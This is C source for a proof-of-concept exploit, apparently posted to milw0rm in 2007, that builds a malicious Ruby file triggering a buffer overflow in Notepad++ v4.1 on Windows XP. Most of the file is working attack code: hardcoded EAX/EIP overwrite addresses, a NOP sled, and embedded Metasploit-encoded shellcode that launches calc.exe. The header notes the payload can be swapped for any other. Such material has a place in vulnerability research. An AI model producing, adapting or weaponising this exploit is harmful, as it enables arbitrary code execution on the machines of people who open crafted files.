/*[ notepad++[v4.1]: (win32) ruby file processing buffer overflow exploit. ]*
  *                                                                         *
  * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)                        *
  *                                                                         *
  * compile:                                                                *
  *  gcc xnotepad++.c -o xnotepad++                                         *
  *                                                                         *
  * syntax:                                                                 *
  *  ./xnotepad++ [-xe] -f filename                                         *
  *                                                                         *
  * notepad++ homepage/url:                                                 *
  *  http://sourceforge.net/projects/notepad-plus/                          *
  *  http://notepad-plus.sourceforge.net/                                   *
  *                                                                         *
  * notepad++ contains a buffer overflow vulnerability in the way it        *
  * processes ruby source files (.rb).  this exploit works by overwriting   *
  * EAX which gets called during processing as "CALL DWORD EAX+4", so EAX   *
  * needs to point to a user-controlled area that contains another address  *
  * which will then become EIP.  once EIP is controlled it simply jumps a   *
  * little bit forward in memory to the nop sled/shellcode.                 *
  *                                                                         *
  * as of now, this will only be successful if the created file is opened   *
  * via "Edit with notepad++" on the file, not when opening a file from     *
  * inside notepad++.  this is mainly to prove this vulnerability can be    *
  * exploited.                                                              *
  *                                                                         *
  * exploitation method(file.rb):                                           *
  *  [FILLERx32][NEW_EAX][FILLERx128]\r\n                                   *
  *  # [NEW_EIPx1000][NOPSx4000][SHELLCODE]\r\n                             *
  *                                                                         *
  * (i was a bit liberal with the new_eip/shellcode space, can pretty much  *
  * make it as large as you like.  also, addresses with null-bytes are      *
  * allowed)                                                                *
  *                                                                         *
  * if successful, notepad++ will spawn calc.exe by default, swap the       *
  * shellcode out if you want a different result.  this was tested on winXP *
  * SP2 ENG, if it is something else the EAX/EIP addresses may need to be   *
  * fished out of memory in your favorite debugger.                         *
  ***************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <getopt.h>

#define DFL_EAX 0x000fd47c /* winXP SP2 ENG */
#define DFL_EIP 0x000fe3d0 /* winXP SP2 ENG */

/* win32_exec -  EXITFUNC=thread CMD=calc.exe Size=164 */
/* Encoder=PexFnstenvSub http://metasploit.com */
static unsigned char x86_exec[] =
"\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x19\x25\xc7\x83\xeb\xfc\xe2\xf4\x24\xf1\x61\xc7\xd8\x19\xae\x82"
"\xe4\x92\x59\xc2\xa0\x18\xca\x4c\x97\x01\xae\x98\xf8\x18\xce\x8e"
"\x53\x2d\xae\xc6\x36\x28\xe5\x5e\x74\x9d\xe5\xb3\xdf\xd8\xef\xca"
"\xd9\xdb\xce\x33\xe3\x4d\x01\xc3\xad\xfc\xae\x98\xfc\x18\xce\xa1"
"\x53\x15\x6e\x4c\x87\x05\x24\x2c\x53\x05\xae\xc6\x33\x90\x79\xe3"
"\xdc\xda\x14\x07\xbc\x92\x65\xf7\x5d\xd9\x5d\xcb\x53\x59\x29\x4c"
"\xa8\x05\x88\x4c\xb0\x11\xce\xce\x53\x99\x95\xc7\xd8\x19\xae\xaf"
"\xe4\x46\x14\x31\xb8\x4f\xac\x3f\x5b\xd9\x5e\x97\xb0\xf6\xeb\x27"
"\xb8\x71\xbd\x39\x52\x17\x72\x38\x3f\x7a\x44\xab\xbb\x37\x40\xbf"
"\xbd\x19\x25\xc7";

struct{
 unsigned int eax;
 unsigned int eip;
 char *file;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
unsigned char write_rb(char *,unsigned int,unsigned int);
void printe(char *,short);
void usage(char *);

/* start. */
int main(int argc,char **argv){
 signed int chr=0;
 char *ptr;

 printf("[*] notepad++[v4.1]: (win32) ruby file processing buffer over"
 "flow exploit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)"
 "\n\n");

 tbl.eax=DFL_EAX;
 tbl.eip=DFL_EIP;

 while((chr=getopt(argc,argv,"f:x:e:"))!=EOF){
  switch(chr){
   case 'f':
    if(!tbl.file){
     if((ptr=rindex(optarg,'.'))&&!strcasecmp(ptr,".rb")){
      if(!(tbl.file=(char *)strdup(optarg)))
        printe("main(): allocating memory failed",1);
     }
     else{
      if(!(tbl.file=(char *)malloc(strlen(optarg)+4)))
       printe("main(): allocating memory failed",1);
      sprintf(tbl.file,"%s.rb",optarg); 
     }
    }
    break;
   case 'x':
    sscanf(optarg,"%x",&tbl.eax);
    break;
   case 'e':
    sscanf(optarg,"%x",&tbl.eip);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!tbl.file)usage(argv[0]);

 printf("[*] filename:\t\t\t%s\n",tbl.file);
 printf("[*] EAX address:\t\t0x%.8x\n",tbl.eax);
 printf("[*] EIP address:\t\t0x%.8x\n\n",tbl.eip);

 if(write_rb(tbl.file,tbl.eax,tbl.eip))
  printe("failed to write to file.",1);
 exit(0);
}

/* write the ruby file. */
unsigned char write_rb(char *file,unsigned int eax,unsigned int eip){
 unsigned int i=0;
 unsigned int real_eax=eax-4;
 unsigned char filler='x';
 unsigned char nop=0x90;
 FILE *fs;
 if(!(fs=fopen(file, "wb")))return(1);
 for(i=0;i<32;i++){
  fwrite(&filler,1,1,fs);
 }
 /* EAX overwrite, "CALL DWORD EAX+4" will be processed. */
 fwrite(&real_eax,4,1,fs);
 for(i=0;i<128;i++){
  fwrite(&filler,1,1,fs);
 }
 /* from here on will be commented out, but loaded into memory. */
 fwrite("\r\n# ",4,1,fs);
 /* EAX overwrite will point here, and change the EIP to this. */
 for(i=0;i<1000;i++){
  fwrite(&eip,4,1,fs);
 }
 /* EIP from above will point into this nop sled. */
 for(i=0;i<4000;i++){
  fwrite(&nop,1,1,fs);
 }
 /* if all went well, execute away! */
 fwrite(&x86_exec,sizeof(x86_exec),1,fs);
 fwrite("\r\n",2,1,fs);
 fclose(fs);
 return(0);
}

/* error! */
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}

/* usage. */
void usage(char *progname){
 printf("syntax: %s [-xe] -f filename\n\n",progname);
 printf("  -f <file>\tfilename to output.\n");
 printf("  -x <addr>\tEAX address, points to new EIP address in memory (0x%.8x)\n",
 tbl.eax);
 printf("  -e <addr>\tEIP address, points to NOPS/shellcode (0x%.8x)\n\n",tbl.eip);
 exit(0);
}

// milw0rm.com [2007-05-12]